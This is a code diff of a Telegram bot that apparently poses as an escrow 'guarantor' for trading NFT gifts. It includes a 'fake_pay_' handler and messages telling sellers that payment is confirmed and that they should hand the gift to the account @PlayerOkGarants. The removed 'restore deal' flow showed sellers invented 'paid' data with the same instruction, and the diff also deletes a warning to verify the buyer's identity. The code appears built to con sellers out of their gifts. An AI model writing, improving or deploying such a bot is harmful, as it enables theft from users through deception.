@@ -18,14 +18,14 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 from config import BOT_TOKEN, BOT_USERNAME, SUPER_ADMIN_IDS
 from database import db
-from states import DealStates, RequisitesStates, ScamStates, WithdrawStates, AdminStates, PaymentStates
+from states import DealStates, RequisitesStates, WithdrawStates, AdminStates
 from keyboards import (
     main_menu,
+    admin_panel_menu,
     lang_menu,
     deal_type_menu,
     currency_menu,
     requisites_edit_menu,
-    scam_base_menu,
     back_menu,
     deal_buyer_menu,
     deal_seller_menu,
@@ -42,10 +42,10 @@ logger = logging.getLogger(__name__)
 
 # Рандомный кошелек гаранта (для демонстрации)
 GUARANTOR_WALLETS = [
-    "UQA1478ВГ472О95-S7465HSAL234KD195HYD6_148GH-1",
-    "UQA1478ВГ472О95-S7465HSAL234KD195HYD6_148GH-1",
-    "UQA1478ВГ472О95-S7465HSAL234KD195HYD6_148GH-1",
-    "UQA1478ВГ472О95-S7465HSAL234KD195HYD6_148GH-1",
+    "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "EQD__________________________________________",
+    "UQB__________________________________________",
+    "EQC__________________________________________",
 ]
 
 def get_random_wallet() -> str:
@@ -55,20 +55,13 @@ async def send_video_menu(target, user_id: int, username: str, first_name: str):
     """Отправляет меню с видео"""
     user_data = db.get_user(user_id)
     rating = user_data[7] if user_data else 5.0
-    deals_count = user_data[5] if user_data else 0
-    stats = db.get_stats()
-    total_paid = stats[1] if stats else 0
     lang = db.get_user_lang(user_id)
     
     is_super = user_id in SUPER_ADMIN_IDS
     markup = main_menu(is_super_admin=is_super, lang=lang)
 
     text = t('main_menu', lang).format(
-        name=first_name,
-        rating=get_rating_stars(rating),
-        val=f"{rating:.1f}",
-        deals=deals_count,
-        total=format_amount(total_paid)
+        name=first_name
     )
 
     try:
@@ -227,7 +220,6 @@ async def cmd_start(message: Message, command: CommandObject, bot: Bot):
 💰 <b>Сумма:</b> {amount_str} {escape_html(deal["currency"])}
 
 <i>Ожидайте подтверждение оплаты от покупателя.</i>
-<b>⚠️ Внимание! Убедитесь что имя покупателя присоединившегося к сделке совпадает с именем человека с которым вы договорились о сделке!</b>
 """
             await bot.send_message(
                 deal["seller_id"],
@@ -262,59 +254,18 @@ async def new_deal_handler(callback: CallbackQuery, state: FSMContext):
     )
     await state.set_state(DealStates.waiting_deal_type)
 
-@dp.callback_query(F.data == "restore_deal")
-async def restore_deal_handler(callback: CallbackQuery, state: FSMContext):
-    """Восстановление старой сделки"""
-    lang = db.get_user_lang(callback.from_user.id)
+@dp.callback_query(F.data == "admin_panel")
+async def admin_panel_handler(callback: CallbackQuery):
+    """Админ панель"""
+    if callback.from_user.id not in SUPER_ADMIN_IDS:
+        return await callback.answer("У вас нет прав доступа к админ панели!", show_alert=True)
+    
     await callback.answer()
-    
-    text = """
-🔄 <b>Восстановление сделки</b>
-
-🙏 <b>Приносим извинения за неудобства!</b>
-
-Если у вас была незавершенная сделка в старом боте, вы можете восстановить её здесь.
-
-📎 <b>Пожалуйста, вставьте ссылку на старую сделку:</b>
-
-Пример: <code>https://t.me/GiftsOkBot?start=deal_123456</code>
-
-<i>После ввода ссылки мы автоматически восстановим информацию о сделке.</i>
-"""
-    await send_video_message(callback, text, back_menu())
-    await state.set_state(DealStates.waiting_restore_link)
-
-@dp.message(DealStates.waiting_restore_link, F.text)
-async def process_restore_deal(message: Message, state: FSMContext):
-    """Обработка ссылки на восстановление сделки"""
-    link = message.text.strip()
-    
-    # Демо-данные для восстановления (товар НЕ кликабельный)
-    demo_deal = {
-        "amount": 1800,
-        "currency": "RUB",
-        "item": "t.me/nft/PetSnake-179530",
-        "status": "paid"
-    }
-    
-    # Текст для продавца (как при подтверждении оплаты)
-    seller_text = f"""
-✅ <b>Сделка успешно восстановлена!</b>
-
-💰 <b>Сумма:</b> {format_amount(demo_deal['amount'])} {demo_deal['currency']}
-
-📦 <b>Товар:</b> <code>{demo_deal['item']}</code>
-
-🎁 <b>Инструкция по передаче подарка:</b>
-
-1️⃣ Передайте подарок гаранту: @PlayerokGarants
-2️⃣ Передача подтверждается автоматически
-3️⃣ После подтверждения средства зачислятся на баланс
-
-<i>Если у вас возникли вопросы, обратитесь в поддержку.</i>
-"""
-    await send_video_message(message, seller_text, back_menu())
-    await state.clear()
+    await send_video_message(
+        callback,
+        "⚙️ <b>Админ панель</b>\n\nВыберите действие:",
+        admin_panel_menu()
+    )
 
 @dp.callback_query(F.data == "back_to_deal_type")
 async def back_to_deal_type_handler(callback: CallbackQuery, state: FSMContext):
@@ -494,11 +445,6 @@ async def requisites_handler(callback: CallbackQuery):
     await callback.answer()
     await send_video_message(callback, text, requisites_edit_menu())
 
-@dp.callback_query(F.data == "scam_base")
-async def scam_base_handler(callback: CallbackQuery):
-    await callback.answer()
-    await send_video_message(callback, "Выберите действие:", scam_base_menu())
-
 @dp.callback_query(F.data == "my_deals")
 async def my_deals_handler(callback: CallbackQuery):
     deals = db.get_user_deals(callback.from_user.id)
@@ -632,7 +578,7 @@ async def get_requisite_value(message: Message, state: FSMContext):
     await send_video_message(message, "✅ Реквизиты сохранены!", back_menu())
     await state.clear()
 
-# ==================== НОВЫЕ ХЕНДЛЕРЫ СДЕЛОК ====================
+# ==================== ХЕНДЛЕРЫ СДЕЛОК ====================
 
 @dp.callback_query(F.data.startswith("fake_pay_"))
 async def fake_pay_handler(callback: CallbackQuery):
@@ -657,7 +603,7 @@ async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
     db.mark_paid(deal_id)
     amount_str = format_amount(deal["amount"])
     
-    # Уведомляем продавца с инструкцией (как при восстановлении)
+    # Уведомляем продавца с инструкцией
     seller_text = f"""
 ✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>
 
@@ -667,7 +613,7 @@ async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
 
 🎁 <b>Инструкция по передаче подарка:</b>
 
-1️⃣ Передайте подарок гаранту: @PlayerokGarants
+1️⃣ Передайте подарок гаранту: @PlayerOkGarants
 2️⃣ Передача подтверждается автоматически
 3️⃣ После подтверждения средства зачислятся на баланс
 
@@ -752,7 +698,7 @@ async def menu_handler(callback: CallbackQuery):
     await callback.answer()
     await send_video_menu(callback, callback.from_user.id, callback.from_user.username or "", callback.from_user.first_name)
 
-# ==================== АДМИН ПАНЕЛЬ ====================
+# ==================== АДМИН ПАНЕЛЬ - ХЕНДЛЕРЫ ====================
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list_handler(callback: CallbackQuery):
